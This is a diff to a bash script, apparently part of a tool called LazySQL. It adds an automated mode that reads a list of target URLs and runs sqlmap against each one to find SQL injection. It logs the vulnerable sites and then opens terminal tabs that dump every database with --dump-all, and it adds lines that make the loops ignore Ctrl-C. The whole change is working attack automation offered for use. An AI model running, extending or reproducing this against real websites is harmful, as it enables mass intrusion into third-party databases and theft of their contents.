@@ -1,6 +1,6 @@
 #!/bin/bash
 ##Settings#
-vn=2.4
+vn=2.5
 
 
 function versioncheck () {
@@ -195,7 +195,6 @@ function list (){
 
 ##Multiple target automatic##
 function multi (){
-  clear
   rm -f .msql.found
   echo
   echo "  __  __       _ _   _ ____   ___  _     ";
@@ -246,6 +245,7 @@ function multi (){
   echo "Now starting automatic scanning and dumping using '$list'."
   tput sgr0;
   sleep 3
+trap '' INT
   while IFS= read -r url; do
     echo "Using: $url"
     echo
@@ -295,6 +295,7 @@ function multi (){
   echo "Starting database dumps in new window!"
   tput rmso;
   sleep 3
+  trap '' INT
   while IFS= read -r url; do
   gnome-terminal --tab -- bash -c "sqlmap --timeout 30 --random-agent -o --output-dir=~/MultiSQL/Dump/ --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""" &>/dev/null
   done < ".msql.dump"
@@ -449,4 +450,114 @@ function commandargs (){
   else
     menu
   fi
+}
+
+function multiauto (){
+  clear
+  rm -f .msql.found
+  echo
+  echo "  __  __       _ _   _ ____   ___  _     ";
+  echo " |  \/  |_   _| | |_(_) ___| / _ \| |    ";
+  echo " | |\/| | | | | | __| \___ \| | | | |    ";
+  echo " | |  | | |_| | | |_| |___) | |_| | |___ ";
+  echo " |_|  |_|\__,_|_|\__|_|____/ \__\_\_____|";
+  echo "                                         ";
+  echo
+  tput bold;
+  tput smso;
+  echo "Every line in the target file should start with the url!"
+  echo
+  echo "This script is part of LazySQL, for more information go to:"
+  echo "https://github.com/Inbell1s/LazySQL"
+  tput sgr0;
+  echo
+  echo "Path to target list:"
+  list=~/target
+  echo
+  while true; do
+    if [ -e "$list" ]
+    then
+      grep -o '^[^ ]\+' $list > "msql.target"
+      echo
+      tput setaf 2;
+      echo "File found!"
+      echo
+      echo "Number of targets:"
+      tput sgr0;
+      cat "msql.target" | wc -l
+      sleep 3
+      break
+    else
+      echo
+      tput setaf 1;
+      echo "File not found, please check your path!"
+      tput sgr0;
+      echo
+      echo "Path to target list:"
+      read -r list
+    fi
+  done
+  echo
+  tput bold;
+  tput smul;
+  tput setaf 1;
+  echo "Now starting automatic scanning and dumping using '$list'."
+  tput sgr0;
+  sleep 3
+trap '' INT
+  while IFS= read -r url; do
+    echo "Using: $url"
+    echo
+    unbuffer sqlmap --timeout 30 --random-agent --smart --batch --output-dir=~/MultiSQL/Dump/ --threads 3 --dbs -u "$url" | tee lsql.log
+    echo
+    if  grep -q "back-end DBMS:" lsql.log; then
+    now=$(date)
+    	if grep -q "$url" ~/.lsql.vul; then
+    	tput smso;
+    	echo "Previously added url!"
+    	else
+        echo "$url - $now" >> ~/.lsql.vul
+        echo "$url" >> ~/lsql.list
+        echo "$url - $now" >> /.msql.found
+    	echo "Added to log!"
+    	tput rmso;
+    fi
+    tput smso;
+    echo
+    echo "Injection found."
+    tput rmso;
+    else
+    echo
+    echo "$url" >> /.lsql.no
+    tput smso;
+    echo "No injection found."
+    tput rmso;
+    fi
+
+    if grep -q "$url" ~/.lsql.vul; then
+    echo "$url" >> .msql.dump
+    else
+    sleep 0
+    fi
+  done < "msql.target"
+  echo
+  tput smso;
+  echo "All targets processed!"
+  tput rmso;
+  echo
+  echo "Valid injections found:"
+  echo
+  cat -n .msql.dump
+  sleep 5
+  echo
+  tput smso;
+  echo "Starting database dumps in new window!"
+  tput rmso;
+  sleep 3
+  trap '' INT
+  while IFS= read -r url; do
+  gnome-terminal --tab -- bash -c "sqlmap --timeout 30 --random-agent -o --output-dir=~/MultiSQL/Dump/ --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""" &>/dev/null
+  done < ".msql.dump"
+  rm -f .msql.dump
+  exit 0
 }
